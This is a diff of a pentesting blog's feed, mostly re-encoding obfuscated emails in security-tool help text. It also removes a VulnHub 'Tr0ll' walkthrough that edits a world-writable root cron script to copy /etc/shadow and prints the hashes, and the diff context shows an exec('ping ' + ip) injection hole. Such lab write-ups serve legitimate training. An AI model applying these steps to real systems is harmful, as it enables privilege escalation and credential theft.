+SNA or libpcap IEEE 802.15.4 encrypted packet &ndash; <a href="&#x6d;&#97;&#x69;&#x6c;&#116;&#x6f;&#58;&#x6a;&#119;&#x72;&#x69;&#103;&#x68;&#x74;&#x40;&#119;&#x69;&#108;&#x6c;&#x68;&#97;&#99;&#107;&#x66;&#x6f;&#114;&#115;&#117;&#115;&#104;&#105;&#x2e;&#99;&#x6f;&#x6d;">&#x6a;&#119;&#x72;&#105;&#103;&#104;&#x74;&#x40;&#x77;&#x69;&#108;&#x6c;&#104;&#97;&#x63;&#x6b;&#102;&#x6f;&#x72;&#x73;&#117;&#115;&#x68;&#105;&#46;&#99;&#111;&#x6d;</a></p>
 
 <p>Usage: zbgoodfind [-frRFd] [-f binary file] [-r pcapfile] [-R daintreefile]</p>
 
@@ -767,7 +1159,7 @@ SNA or libpcap IEEE 802.15.4 encrypted packet &ndash; <a href="&#x6d;&#97;&#105;
 
 <p>``` plain
 zbreplay: replay ZigBee/802.15.4 network traffic from libpcap or Daintree files
-<a href="&#109;&#x61;&#105;&#108;&#116;&#x6f;&#58;&#x6a;&#x77;&#x72;&#105;&#103;&#104;&#116;&#64;&#119;&#x69;&#108;&#x6c;&#x68;&#97;&#x63;&#x6b;&#x66;&#x6f;&#x72;&#115;&#117;&#x73;&#104;&#105;&#x2e;&#x63;&#111;&#109;">&#x6a;&#x77;&#114;&#105;&#x67;&#x68;&#x74;&#x40;&#119;&#x69;&#x6c;&#108;&#104;&#x61;&#x63;&#x6b;&#x66;&#x6f;&#114;&#115;&#117;&#x73;&#104;&#x69;&#46;&#99;&#x6f;&#109;</a></p>
+<a href="&#109;&#97;&#105;&#x6c;&#116;&#x6f;&#58;&#x6a;&#119;&#x72;&#105;&#x67;&#104;&#116;&#x40;&#119;&#105;&#108;&#108;&#104;&#x61;&#x63;&#x6b;&#x66;&#x6f;&#x72;&#115;&#x75;&#x73;&#104;&#x69;&#x2e;&#99;&#x6f;&#x6d;">&#x6a;&#x77;&#x72;&#105;&#x67;&#104;&#116;&#64;&#x77;&#105;&#x6c;&#x6c;&#104;&#x61;&#x63;&#107;&#102;&#x6f;&#x72;&#115;&#117;&#115;&#104;&#105;&#x2e;&#99;&#x6f;&#x6d;</a></p>
 
 <p>Usage: zbreplay [-rRfiDch] [-f channel] [-r pcapfile] [-R daintreefile]</p>
 
@@ -783,7 +1175,7 @@ channel hopping to identify ZC/ZR devices.</p>
 
 <p>``` plain
 zbstumbler: Transmit beacon request frames to the broadcast address while
-channel hopping to identify ZC/ZR devices.  <a href="&#x6d;&#x61;&#105;&#x6c;&#116;&#111;&#x3a;&#x6a;&#119;&#114;&#105;&#103;&#x68;&#x74;&#64;&#x77;&#105;&#x6c;&#x6c;&#x68;&#97;&#x63;&#x6b;&#x66;&#x6f;&#x72;&#115;&#x75;&#x73;&#x68;&#x69;&#x2e;&#99;&#x6f;&#109;">&#106;&#119;&#x72;&#105;&#103;&#104;&#116;&#64;&#x77;&#105;&#108;&#x6c;&#104;&#x61;&#99;&#107;&#102;&#x6f;&#x72;&#x73;&#117;&#x73;&#x68;&#105;&#46;&#99;&#x6f;&#x6d;</a></p>
+channel hopping to identify ZC/ZR devices.  <a href="&#x6d;&#97;&#105;&#108;&#x74;&#x6f;&#58;&#106;&#x77;&#114;&#x69;&#103;&#104;&#116;&#64;&#119;&#105;&#x6c;&#108;&#104;&#97;&#x63;&#107;&#x66;&#111;&#114;&#x73;&#x75;&#x73;&#104;&#105;&#46;&#99;&#111;&#109;">&#106;&#x77;&#114;&#105;&#x67;&#104;&#x74;&#x40;&#119;&#105;&#x6c;&#108;&#104;&#x61;&#99;&#107;&#x66;&#x6f;&#x72;&#115;&#x75;&#x73;&#x68;&#x69;&#46;&#x63;&#x6f;&#109;</a></p>
 
 <p>Usage: zbstumbler [-iscwD] [-i devnumstring] [-s per-channel delay] [-c channel]</p>
 
@@ -831,7 +1223,7 @@ Usage: mfterm [-v] [-h] [-k keyfile]</p>
   &mdash;keys=keyfile  (-k)   Load keys from the specified file.
   &mdash;dict=dictfile (-d)   Load dictionary from the specified file.</p>
 
-<p>Report bugs to: <a href="&#109;&#x61;&#x69;&#108;&#x74;&#x6f;&#58;&#x61;&#x6e;&#x64;&#x65;&#114;&#x73;&#x40;&#x34;&#x7a;&#109;&#x2e;&#x6f;&#114;&#x67;">&#x61;&#x6e;&#x64;&#101;&#114;&#x73;&#64;&#52;&#x7a;&#109;&#46;&#111;&#x72;&#x67;</a>
+<p>Report bugs to: <a href="&#109;&#97;&#105;&#108;&#x74;&#111;&#58;&#97;&#110;&#100;&#101;&#114;&#115;&#x40;&#52;&#122;&#109;&#46;&#111;&#114;&#103;">&#x61;&#110;&#x64;&#x65;&#114;&#115;&#x40;&#x34;&#122;&#109;&#x2e;&#111;&#114;&#x67;</a>
 mfterm home page: <a href="https://github.com/4zm/mfterm">https://github.com/4zm/mfterm</a>
 ```</p>
 
@@ -1667,7 +2059,7 @@ Analyzing &lsquo;$2a$08$VPzNKPAY60FsAbnq.c.h5.XTCZtC1z.j3hnlDFGImN9FcpfR1QnLq&rs
    #        \/</em>/\/<em>/\/__/\/</em>/\/<strong><em>/    \/</em>/\/<em>/     \/</em></strong><strong>/  \/</strong>_/  v1.1 #
    #                                 By Zion3R #
    #                            www.Blackploit.com #
-   #                               <a href="&#x6d;&#97;&#x69;&#108;&#x74;&#111;&#x3a;&#82;&#x6f;&#111;&#x74;&#x40;&#66;&#x6c;&#97;&#x63;&#107;&#x70;&#108;&#x6f;&#x69;&#x74;&#x2e;&#99;&#x6f;&#109;">&#82;&#111;&#111;&#x74;&#x40;&#x42;&#108;&#97;&#x63;&#x6b;&#x70;&#108;&#x6f;&#105;&#116;&#x2e;&#x63;&#111;&#109;</a> #
+   #                               <a href="&#x6d;&#x61;&#105;&#108;&#x74;&#111;&#58;&#82;&#111;&#x6f;&#116;&#64;&#66;&#x6c;&#97;&#99;&#x6b;&#112;&#108;&#111;&#x69;&#116;&#x2e;&#99;&#111;&#x6d;">&#82;&#x6f;&#x6f;&#x74;&#x40;&#66;&#108;&#x61;&#99;&#x6b;&#x70;&#108;&#x6f;&#x69;&#116;&#46;&#x63;&#111;&#x6d;</a> #
    #########################################################################</p>
 
 <hr />
@@ -1972,12 +2364,12 @@ md5-half, plaintext_len limit: 0 - 15
 
 <p>``` plain
 RainbowCrack (improved, multi-threaded) &ndash; Making a Faster Cryptanalytic Time-Memory Trade-Off
-by Martin Westergaard <a href="&#109;&#x61;&#105;&#x6c;&#116;&#x6f;&#x3a;&#x6d;&#97;&#x72;&#116;&#105;&#x6e;&#119;&#106;&#50;&#x30;&#x30;&#53;&#64;&#103;&#109;&#x61;&#105;&#x6c;&#x2e;&#99;&#111;&#x6d;">&#x6d;&#97;&#x72;&#116;&#105;&#110;&#119;&#106;&#x32;&#x30;&#48;&#53;&#64;&#x67;&#x6d;&#97;&#x69;&#108;&#46;&#x63;&#111;&#109;</a>
+by Martin Westergaard <a href="&#x6d;&#97;&#105;&#x6c;&#116;&#111;&#58;&#x6d;&#x61;&#x72;&#x74;&#105;&#x6e;&#119;&#x6a;&#50;&#x30;&#48;&#53;&#64;&#103;&#109;&#x61;&#x69;&#x6c;&#46;&#x63;&#x6f;&#x6d;">&#x6d;&#97;&#x72;&#x74;&#105;&#110;&#x77;&#x6a;&#x32;&#48;&#48;&#53;&#x40;&#x67;&#x6d;&#97;&#105;&#108;&#x2e;&#99;&#111;&#109;</a>
 multi-threaded and enhanced by neinbrucke
-*nix/64-bit compatibility and co-maintainer &ndash; James Nobis <a href="&#x6d;&#97;&#x69;&#108;&#116;&#111;&#58;&#113;&#x75;&#x65;&#x6c;&#64;&#113;&#x75;&#x65;&#108;&#x72;&#111;&#100;&#46;&#x6e;&#101;&#x74;">&#113;&#117;&#101;&#108;&#64;&#x71;&#x75;&#101;&#x6c;&#x72;&#x6f;&#x64;&#x2e;&#110;&#x65;&#116;</a>
+*nix/64-bit compatibility and co-maintainer &ndash; James Nobis <a href="&#x6d;&#97;&#x69;&#108;&#116;&#111;&#x3a;&#x71;&#x75;&#101;&#108;&#64;&#x71;&#117;&#x65;&#108;&#x72;&#111;&#x64;&#46;&#110;&#101;&#x74;">&#x71;&#117;&#x65;&#x6c;&#64;&#113;&#117;&#101;&#x6c;&#114;&#x6f;&#x64;&#46;&#x6e;&#101;&#116;</a>
 <a href="http://www.freerainbowtables.com/">http://www.freerainbowtables.com/</a>
 All code/binaries are under GPL2 Copyright at a minimum
-original code by Zhu Shuanglei <a href="&#x6d;&#x61;&#x69;&#108;&#x74;&#111;&#x3a;&#x73;&#104;&#x75;&#x61;&#110;&#103;&#x6c;&#x65;&#x69;&#64;&#x68;&#x6f;&#116;&#x6d;&#97;&#x69;&#108;&#46;&#99;&#x6f;&#x6d;">&#115;&#104;&#x75;&#97;&#x6e;&#103;&#108;&#101;&#x69;&#x40;&#104;&#x6f;&#116;&#x6d;&#x61;&#x69;&#x6c;&#46;&#99;&#x6f;&#x6d;</a></p>
+original code by Zhu Shuanglei <a href="&#x6d;&#97;&#105;&#x6c;&#x74;&#111;&#58;&#x73;&#104;&#117;&#97;&#110;&#103;&#x6c;&#x65;&#105;&#x40;&#104;&#x6f;&#x74;&#109;&#x61;&#x69;&#x6c;&#46;&#x63;&#111;&#109;">&#115;&#104;&#117;&#x61;&#110;&#103;&#x6c;&#x65;&#x69;&#x40;&#x68;&#x6f;&#116;&#x6d;&#x61;&#105;&#108;&#46;&#99;&#111;&#109;</a></p>
 
 <p>usage: rcracki_mt -h hash rainbow_table_pathname</p>
 
@@ -2016,7 +2408,7 @@ rainbow_table_pathname: pathname(s) of the rainbow table(s)</p>
 <p>RSMangler will take a wordlist and perform various manipulations on it similar to those done by John the Ripper, the main difference being that it will first take the input words and generate all permutations and the acronym of the words (in the order they appear in the file) before it applies the rest of the mangles.</p>
 
 <p>``` plain
-rsmangler v 1.4 Robin Wood (<a href="&#x6d;&#x61;&#105;&#108;&#116;&#111;&#58;&#x72;&#x6f;&#x62;&#x69;&#110;&#x40;&#x64;&#x69;&#x67;&#x69;&#110;&#105;&#110;&#106;&#x61;&#x2e;&#x6f;&#114;&#103;">&#114;&#111;&#98;&#x69;&#110;&#x40;&#x64;&#105;&#x67;&#x69;&#x6e;&#x69;&#110;&#106;&#x61;&#46;&#111;&#114;&#x67;</a>) &lt;www.randomstorm.com></p>
+rsmangler v 1.4 Robin Wood (<a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#111;&#x3a;&#114;&#x6f;&#98;&#105;&#x6e;&#64;&#100;&#105;&#x67;&#x69;&#x6e;&#105;&#110;&#106;&#x61;&#46;&#111;&#114;&#x67;">&#114;&#111;&#x62;&#105;&#110;&#x40;&#100;&#x69;&#x67;&#x69;&#110;&#105;&#x6e;&#x6a;&#97;&#x2e;&#111;&#x72;&#x67;</a>) &lt;www.randomstorm.com></p>
 
 <p>To pass the initial words in on standard in do:</p>
 
@@ -2062,7 +2454,7 @@ rsmangler v 1.4 Robin Wood (<a href="&#x6d;&#x61;&#105;&#108;&#116;&#111;&#58;&#
 <p>``` plain
 samdump2 1.1.1 by Objectif Securite
 <a href="http://www.objectif-securite.ch">http://www.objectif-securite.ch</a>
-original author: <a href="&#109;&#x61;&#x69;&#108;&#116;&#x6f;&#58;&#x6e;&#99;&#x75;&#111;&#109;&#111;&#64;&#115;&#x74;&#117;&#100;&#101;&#x6e;&#x74;&#105;&#46;&#x75;&#110;&#105;&#110;&#97;&#x2e;&#105;&#116;">&#x6e;&#x63;&#x75;&#x6f;&#x6d;&#111;&#x40;&#x73;&#x74;&#117;&#x64;&#x65;&#110;&#x74;&#105;&#46;&#117;&#110;&#105;&#x6e;&#x61;&#46;&#x69;&#116;</a></p>
+original author: <a href="&#109;&#97;&#105;&#108;&#116;&#x6f;&#58;&#x6e;&#x63;&#117;&#x6f;&#109;&#x6f;&#x40;&#115;&#x74;&#x75;&#x64;&#x65;&#x6e;&#116;&#105;&#x2e;&#x75;&#x6e;&#105;&#x6e;&#x61;&#46;&#105;&#116;">&#x6e;&#99;&#x75;&#x6f;&#109;&#111;&#x40;&#x73;&#x74;&#117;&#100;&#101;&#x6e;&#x74;&#105;&#46;&#x75;&#x6e;&#105;&#110;&#97;&#46;&#x69;&#x74;</a></p>
 
 <p>Usage:
 samdump2 samhive keyfile
@@ -2111,7 +2503,7 @@ sucrack [options] wordlist
 <p>``` plain
 TrueCrack v3.0
 Website: <a href="http://code.google.com/p/truecrack">http://code.google.com/p/truecrack</a>
-Contact us: <a href="&#x6d;&#x61;&#105;&#x6c;&#116;&#111;&#x3a;&#x69;&#110;&#102;&#111;&#x74;&#x72;&#x75;&#101;&#99;&#114;&#x61;&#x63;&#107;&#x40;&#x67;&#109;&#x61;&#x69;&#x6c;&#46;&#x63;&#x6f;&#x6d;">&#x69;&#110;&#102;&#111;&#116;&#x72;&#117;&#x65;&#99;&#114;&#97;&#x63;&#107;&#x40;&#103;&#109;&#x61;&#105;&#108;&#46;&#x63;&#x6f;&#109;</a>
+Contact us: <a href="&#109;&#x61;&#105;&#x6c;&#x74;&#x6f;&#x3a;&#105;&#x6e;&#102;&#x6f;&#116;&#114;&#x75;&#x65;&#99;&#x72;&#97;&#99;&#107;&#x40;&#103;&#109;&#97;&#x69;&#108;&#46;&#x63;&#x6f;&#x6d;">&#105;&#x6e;&#102;&#x6f;&#116;&#114;&#117;&#x65;&#99;&#x72;&#97;&#99;&#x6b;&#64;&#x67;&#x6d;&#97;&#105;&#x6c;&#46;&#99;&#111;&#109;</a>
 Bruteforce password cracker for Truecrypt volume. Optimazed with Nvidia Cuda technology.
 Based on TrueCrypt, freely available at <a href="http://www.truecrypt.org/">http://www.truecrypt.org/</a>
 Copyright &copy; 2011 by Luca Vaccaro.</p>
@@ -2221,7 +2613,7 @@ Copyright &copy; 2011 by Luca Vaccaro.</p>
 <h2>Contact:</h2>
 
 <p>[Web]           <a href="http://laxmarcaellugar.blogspot.com/">http://laxmarcaellugar.blogspot.com/</a>
-[Mail/Google+]  <a href="&#x6d;&#97;&#x69;&#108;&#116;&#111;&#58;&#x62;&#108;&#111;&#x67;&#108;&#97;&#120;&#109;&#97;&#x72;&#x63;&#97;&#101;&#x6c;&#x6c;&#117;&#x67;&#97;&#x72;&#x40;&#103;&#109;&#97;&#105;&#x6c;&#46;&#99;&#111;&#109;">&#98;&#108;&#x6f;&#103;&#108;&#x61;&#120;&#x6d;&#x61;&#x72;&#x63;&#97;&#101;&#x6c;&#108;&#x75;&#103;&#x61;&#114;&#64;&#103;&#109;&#97;&#105;&#108;&#x2e;&#x63;&#x6f;&#x6d;</a>
+[Mail/Google+]  <a href="&#109;&#x61;&#105;&#x6c;&#x74;&#x6f;&#58;&#x62;&#108;&#x6f;&#x67;&#x6c;&#x61;&#x78;&#x6d;&#97;&#114;&#99;&#97;&#101;&#108;&#x6c;&#x75;&#x67;&#x61;&#x72;&#64;&#103;&#x6d;&#97;&#105;&#x6c;&#x2e;&#99;&#111;&#x6d;">&#98;&#108;&#111;&#103;&#x6c;&#x61;&#x78;&#109;&#x61;&#114;&#x63;&#x61;&#101;&#x6c;&#x6c;&#117;&#103;&#97;&#x72;&#64;&#x67;&#x6d;&#97;&#105;&#108;&#46;&#x63;&#x6f;&#x6d;</a>
 [twitter]       @laXmarcaellugar
 ```</p>
 
@@ -2339,7 +2731,7 @@ a single entry or a file containing multiple entries. Additionally, a combinatio
 
 
 <p>``` plain
-Medusa v2.0 [<a href="http://www.foofus.net">http://www.foofus.net</a>] &copy; JoMo-Kun / Foofus Networks <a href="&#x6d;&#x61;&#x69;&#x6c;&#x74;&#111;&#58;&#106;&#109;&#x6b;&#x40;&#x66;&#111;&#111;&#x66;&#x75;&#115;&#46;&#x6e;&#x65;&#x74;">&#x6a;&#x6d;&#x6b;&#x40;&#x66;&#x6f;&#111;&#x66;&#117;&#x73;&#46;&#110;&#x65;&#116;</a></p>
+Medusa v2.0 [<a href="http://www.foofus.net">http://www.foofus.net</a>] &copy; JoMo-Kun / Foofus Networks <a href="&#109;&#97;&#x69;&#108;&#116;&#x6f;&#58;&#106;&#109;&#107;&#x40;&#102;&#x6f;&#111;&#102;&#x75;&#x73;&#x2e;&#x6e;&#x65;&#116;">&#x6a;&#109;&#107;&#x40;&#102;&#111;&#111;&#x66;&#x75;&#x73;&#x2e;&#110;&#101;&#116;</a></p>
 
 <p>ALERT: Host information must be supplied.</p>
 
@@ -3404,7 +3796,7 @@ o888oo   888  oooo   .ooooo.   888  oooo<br/>
  888     888   888  888   .o8  888 <code>88b.  
 o888o   o888o o888o</code>Y8bod8P' o888o o888o</p>
 
-<p><a href="&#x6d;&#x61;&#105;&#x6c;&#x74;&#x6f;&#58;&#x72;&#x6f;&#111;&#116;&#64;&#x31;&#x39;&#x32;&#46;&#49;&#54;&#56;&#x2e;&#x38;&#x30;&#46;&#49;&#50;&#x39;">&#x72;&#x6f;&#x6f;&#116;&#x40;&#49;&#x39;&#x32;&#x2e;&#x31;&#54;&#x38;&#46;&#x38;&#48;&#46;&#x31;&#x32;&#x39;</a>&rsquo;s password:
+<p><a href="&#109;&#x61;&#105;&#108;&#x74;&#111;&#x3a;&#x72;&#111;&#x6f;&#x74;&#x40;&#49;&#57;&#50;&#x2e;&#x31;&#54;&#x38;&#x2e;&#x38;&#x30;&#x2e;&#x31;&#x32;&#57;">&#114;&#111;&#111;&#116;&#64;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#x38;&#x2e;&#x38;&#48;&#x2e;&#49;&#x32;&#x39;</a>&rsquo;s password:
 ```</p>
 
 <p>I copied that block of hex to an online hex to string converter that spit out a Base64 encoded string:</p>
@@ -4703,405 +5095,6 @@ child = exec('ping ' + ip, function (error, stdout, stderr)
 <p><img class="center" src="/images/pentest/secos/win.png" title="&lsquo;flag&rsquo; &lsquo;flag&rsquo;" ></p>
 
 <blockquote><p>Don&rsquo;t tell any big lies today.  Small ones can be just as effective.</p></blockquote>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Pentest lab - Tr0ll]]></title>
-    <link href="http://chousensha.github.io/blog/2014/11/30/pentest-lab-tr0ll/"/>
-    <updated>2014-11-30T08:48:14+02:00</updated>
-    <id>http://chousensha.github.io/blog/2014/11/30/pentest-lab-tr0ll</id>
-    <content type="html"><![CDATA[<p>Next in my lab series will be another machine from VulnHub:</p>
-
-<blockquote><p>Tr0ll was inspired by the constant trolling of the machines within the OSCP labs.</p>
-
-<p>The goal is simple, gain root and get Proof.txt from the /root directory.</p>
-
-<p>Not for the easily frustrated! Fair warning, there be trolls ahead!</p></blockquote>
-
-<!-- more -->
-
-
-<p>As always, I start with a guns blazing Nmap scan:</p>
-
-<p>``` plain
-nmap -A -p1-65535 192.168.80.134</p>
-
-<p>Starting Nmap 6.47 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-11-30 08:55 EET
-Nmap scan report for 192.168.80.134
-Host is up (0.00086s latency).
-Not shown: 65532 closed ports
-PORT   STATE SERVICE VERSION
-21/tcp open  ftp     vsftpd 3.0.2
-| ftp-anon: Anonymous FTP login allowed (FTP code 230)
-|<em>-rwxrwxrwx    1 1000     0            8068 Aug 09 23:43 lol.pcap [NSE: writeable]
-22/tcp open  ssh     (protocol 2.0)
-| ssh-hostkey:
-|   1024 d6:18:d9:ef:75:d3:1c:29:be:14:b5:2b:18:54:a9:c0 (DSA)
-|   2048 ee:8c:64:87:44:39:53:8c:24:fe:9d:39:a9:ad:ea:db (RSA)
-|</em>  256 0e:66:e6:50:cf:56:3b:9c:67:8b:5f:56:ca:ae:6b:f4 (ECDSA)
-80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
-| http-robots.txt: 1 disallowed entry
-|<em>/secret
-|</em>http-title: Site doesn&rsquo;t have a title (text/html).
-1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at <a href="http://www.insecure.org/cgi-bin/servicefp-submit.cgi">http://www.insecure.org/cgi-bin/servicefp-submit.cgi</a> :
-SF-Port22-TCP:V=6.47%I=7%D=11/30%Time=547ABF60%P=x86_64-unknown-linux-gnu%
-SF:r(NULL,29,&ldquo;SSH-2.0-OpenSSH_6.6.1p1\x20Ubuntu-2ubuntu2\r\n&rdquo;);
-MAC Address: 00:0C:29:F8:CC:3D (VMware)
-Device type: general purpose
-Running: Linux 3.X
-OS CPE: cpe:/o:linux:linux_kernel:3
-OS details: Linux 3.11 &ndash; 3.14
-Network Distance: 1 hop
-Service Info: OS: Unix</p>
-
-<p>TRACEROUTE
-HOP RTT     ADDRESS
-1   0.86 ms 192.168.80.134</p>
-
-<p>OS and Service detection performed. Please report any incorrect results at <a href="http://nmap.org/submit/">http://nmap.org/submit/</a> .
-Nmap done: 1 IP address (1 host up) scanned in 14.06 seconds
-```</p>
-
-<p>Not an awful lot to start with. First thing, I checked what&rsquo;s being served on port 80, and of course, there was a troll:</p>
-
-<p><img class="center" src="/images/pentest/tr0ll/troll1.png" title="&lsquo;troll&rsquo; &lsquo;troll&rsquo;" ></p>
-
-<p>The &ldquo;secret&rdquo; doesn&rsquo;t help much either, other than potentially hinting at the use of steganography, which I am very bad at.</p>
-
-<p><img class="center" src="/images/pentest/tr0ll/troll2.png" title="&lsquo;troll2&rsquo; &lsquo;troll2&rsquo;" ></p>
-
-<p>I also searched for a vsftpd exploit suitable to the 3.0.2 version, which I couldn&rsquo;t find. So before trying to search for hidden data that might not even exist inside the images, and even if it does, I wouldn&rsquo;t be able to find it anyway, I&rsquo;m going to see if there is anything interesting lying around the FTP server.</p>
-
-<p>Logging in with the <em>anonymous/anonymous</em> credentials, I see there is a pcap file waiting:</p>
-
-<p><code>plain
-ftp&gt; ls
-200 PORT command successful. Consider using PASV.
-150 Here comes the directory listing.
--rwxrwxrwx    1 1000     0            8068 Aug 09 23:43 lol.pcap
-226 Directory send OK.
-</code></p>
-
-<p>I downloaded it to my machine so I can check it out with Wireshark:</p>
-
-<p><code>plain
-ftp&gt; get lol.pcap
-local: lol.pcap remote: lol.pcap
-200 PORT command successful. Consider using PASV.
-150 Opening BINARY mode data connection for lol.pcap (8068 bytes).
-226 Transfer complete.
-8068 bytes received in 0.05 secs (148.1 kB/s)
-</code></p>
-
-<p>Scanning through the packets I noticed something interesting:</p>
-
-<p><img class="center" src="/images/pentest/tr0ll/wireshark.png" title="&lsquo;secret stuff&rsquo; &lsquo;secret stuff&rsquo;" ></p>
-
-<p>And when following the stream, even more interesting tidbits:</p>
-
-<p><img class="center" src="/images/pentest/tr0ll/stream.png" title="&lsquo;TCP stream&rsquo; &lsquo;tcp stream&rsquo;" ></p>
-
-<p>So why don&rsquo;t we see the secret stuff for ourselves! In order to see what&rsquo;s inside the secret file, I looked at the FTP-DATA packet that comes after requesting the transfer. I highlighted it below and you can see it&rsquo;s the correct size (147 bytes):</p>
-
-<p><img class="center" src="/images/pentest/tr0ll/ftpdata.png" title="&lsquo;ftp data&rsquo; &lsquo;ftp data&rsquo;" ></p>
-
-<p>If you follow the stream you will see this:</p>
-
-<p>``` plain
-Well, well, well, aren&rsquo;t you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P</p>
-
-<p>Sucks, you were so close&hellip; gotta TRY HARDER!
-```</p>
-
-<p>Finally, some progress! As an aside, this information could also be obtained just by running <em>strings</em> on the pcap file. Now let&rsquo;s go back to the browser and see what&rsquo;s inside that directory. To keep up with the troll theme, there&rsquo;s a BIN file named roflmao. Again I felt a little discouraged because I have only a rudimentary grasp of binary analysis and reverse engineering at the moment. Running <em>strings</em> on it, the only interesting thing I noticed was this line:</p>
-
-<p><code>plain
-Find address 0x0856BF to proceed
-</code></p>
-
-<p>If you run it (make it executable or you will get a permission denied error), you will see that it only prints the above line and exits. Time for GDB!</p>
-
-<p><code>plain
-Dump of assembler code for function main:
-   0x0804841d &lt;+0&gt;: push   ebp
-   0x0804841e &lt;+1&gt;: mov    ebp,esp
-   0x08048420 &lt;+3&gt;: and    esp,0xfffffff0
-   0x08048423 &lt;+6&gt;: sub    esp,0x10
-   0x08048426 &lt;+9&gt;: mov    DWORD PTR [esp],0x80484d0
-   0x0804842d &lt;+16&gt;:    call   0x80482f0 &lt;printf@plt&gt;
-   0x08048432 &lt;+21&gt;:    leave  
-   0x08048433 &lt;+22&gt;:    ret   
-</code></p>
-
-<p>I looked around as much as I could, but the program is a really small one and I could find nothing hidden. Also the address didn&rsquo;t seem to fit in with any of the memory addresses inside the binary, so I thought maybe it&rsquo;s just a hint for continuing elsewhere. The only place that came to mind was to try for another hidden directory on the web server:</p>
-
-<p><img class="center" src="/images/pentest/tr0ll/0856bf.png" title="&lsquo;hidden&rsquo; &lsquo;win&rsquo;" ></p>
-
-<p>Woohoo! We&rsquo;re on the right track. Now it seems both directories contain a text file with..users and a password?</p>
-
-<p><img class="center" src="/images/pentest/tr0ll/which_one.png" title="&lsquo;passwords&rsquo; &lsquo;which pass&rsquo;" ></p>
-
-<p><img class="center" src="/images/pentest/tr0ll/gj.png" title="&lsquo;good job&rsquo; &lsquo;gj&rsquo;" ></p>
-
-<p>I tried connecting to SSH using the password in the Pass.txt files and usernames from the other file. Then I also tried to connect as root, troll, tr0ll, using everything in the lists as password. Manually.. Anyway, when nothing worked, I had to take a break and think that it&rsquo;s most likely trolling me, as it did in all the previous steps. So, looking at the directory index, it&rsquo;s apparent that one folder contains the password and the other one a list with potential usernames, from which you have to find the correct one to go with the password. But since I&rsquo;ve already tried that and failed, I didn&rsquo;t know what else to do. Now, the Pass.txt file contained a good job message that seemed to be the actual password, but maybe it was just a normal good job..implying that I already found the password. So I tried SSH again, this time using Pass as password..and when that didn&rsquo;t work, even which_one_lol. This was more wasted effort, so lastly, I literally used the name of the file as password: Pass.txt. And! Combining it with the overflow user&hellip;success!! Now I started looking around, but before I could find anything, I&rsquo;ve been booted by the shell?!</p>
-
-<p>``` plain
-Broadcast Message from root@trol</p>
-
-<pre><code>    (somewhere) at 5:45 ...                                                
-</code></pre>
-
-<p>TIMES UP LOL!</p>
-
-<p>Connection to 192.168.80.134 closed by remote host.
-Connection to 192.168.80.134 closed.
-```</p>
-
-<p>After more logins, it appears the shell is killed every few minutes. So, this troll might be playing with cron. The only other lead I had so far was a file named <em>lmao.py</em> in the <code>/opt/</code>, but I didn&rsquo;t have permission to read it. I took a look in the <code>/var/log</code> directory:</p>
-
-<p><code>plain
-$ ls /var/log
-alternatives.log    cronlog   fail2ban.log    udev
-alternatives.log.1  dist-upgrade  fail2ban.log.1  upstart
-apache2         dmesg     faillog     vmware-tools-upgrader.log
-apt         dmesg.0   fsck        vsftpd.log
-auth.log        dmesg.1.gz    installer   vsftpd.log.1
-auth.log.1      dmesg.2.gz    kern.log    wtmp
-boot.log        dmesg.3.gz    kern.log.1      wtmp.1
-bootstrap.log       dmesg.4.gz    lastlog
-btmp            dpkg.log      syslog
-btmp.1          dpkg.log.1    syslog.1
-$ cd /var/log
-$ cat cronlog
-*/2 * * * * cleaner.py
-</code></p>
-
-<p>So, that cleaner.py file seems to be a likely culprit. I searched for it and I found something interesting:</p>
-
-<p>``` plain
-$ locate cleaner.py
-/lib/log/cleaner.py
-/var/tmp/cleaner.py.swp
-$ cat /lib/log/cleaner.py</p>
-
-<h1>!/usr/bin/env python</h1>
-
-<p>import os
-import sys
-try:</p>
-
-<pre><code>os.system('rm -r /tmp/* ')
-</code></pre>
-
-<p>except:</p>
-
-<pre><code>sys.exit()
-</code></pre>
-
-<p>$ cat /var/tmp/cleaner.py.swp
-crontab for cleaner.py successful
-```</p>
-
-<p>Ok, so this cleaner deletes all the contents of the <code>/tmp/</code> folder. The great part about it though, is the wonderful permissions it has:</p>
-
-<p><code>plain
-$ ls -l /lib/log/cleaner.py
--rwxrwxrwx 1 root root 96 Aug 13 00:13 /lib/log/cleaner.py
-</code></p>
-
-<p>So we can modify it to help in compromising the system. First thing I did was add the following code to copy the contents of the <code>/etc/shadow</code> file to a txt file in the <em>/tmp/</em> folder:</p>
-
-<p>``` python
-with open(&lsquo;/etc/shadow&rsquo;, &lsquo;r&rsquo;) as shadow:</p>
-
-<pre><code>juicy = shadow.read()
-</code></pre>
-
-<p>with open(&lsquo;/tmp/hashes.txt&rsquo;, &lsquo;a&rsquo;) as hashes:</p>
-
-<pre><code>hashes.write(juicy)
-</code></pre>
-
-<p>```</p>
-
-<p>Now we have the password hashes and we could crack them if we wanted:</p>
-
-<p><code>plain
-$ cat /tmp/hashes.txt
-root:$6$mdQyunCS$qRhQug5j4xuM2vwsSlFJ0TrAVmfCV5h0VgKjbBp5BN2hL6ySxGL8Tt.qa2GlVotm7DFK7OUG9naqK6Kdf1aEZ.:16292:0:99999:7:::
-daemon:*:16273:0:99999:7:::
-bin:*:16273:0:99999:7:::
-sys:*:16273:0:99999:7:::
-sync:*:16273:0:99999:7:::
-games:*:16273:0:99999:7:::
-man:*:16273:0:99999:7:::
-lp:*:16273:0:99999:7:::
-mail:*:16273:0:99999:7:::
-news:*:16273:0:99999:7:::
-uucp:*:16273:0:99999:7:::
-proxy:*:16273:0:99999:7:::
-www-data:*:16273:0:99999:7:::
-backup:*:16273:0:99999:7:::
-list:*:16273:0:99999:7:::
-irc:*:16273:0:99999:7:::
-gnats:*:16273:0:99999:7:::
-nobody:*:16273:0:99999:7:::
-libuuid:!:16273:0:99999:7:::
-syslog:*:16273:0:99999:7:::
-messagebus:*:16291:0:99999:7:::
-troll:$6$9WnrXzBm$ijsblc.QCK1kTlHCxiH5Dt3eUhZgEVaIpkIifyIx6EmPpD03xmIyPD6l/dVlUAE0Q4jGqaiusEkvb3BEDNcs6.:16292:0:99999:7:::
-sshd:*:16291:0:99999:7:::
-ftp:*:16292:0:99999:7:::
